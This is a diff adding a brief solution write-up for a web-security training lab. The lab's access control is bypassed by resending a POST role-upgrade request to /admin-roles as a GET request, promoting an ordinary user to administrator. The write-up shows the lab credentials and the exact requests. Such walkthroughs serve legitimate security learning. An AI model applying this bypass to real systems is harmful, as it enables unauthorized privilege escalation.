@@ -1,0 +1,25 @@
+Lab: Method-based access control can be circumvented
+
+Vulnerability: This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.
+
+Goal: To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.
+
+Analysis and Solution:
+1. Log in with credentials administrator:admin, and see an admin panel.
+
+2. See a functionality in administrator's account: upgrade or downgrade user's role 
+    POST /admin-roles 
+    username=carlos&action=upgrade
+
+3. Log in with credentials wiener:peter, and try to access /admin URL 
+=> Receive an error: Admin interface only available if logged in as an administrator
+
+4. Make a request: 
+    POST /admin-roles 
+    username=wiener&action=upgrade
+=> Receive an error: "Unauthorized"
+
+5. Try change the POST method to GET method:
+    GET /admin-roles?username=wiener&action=upgrade
+=> SUCCESSFULLY
+=> Bypass method-based access control
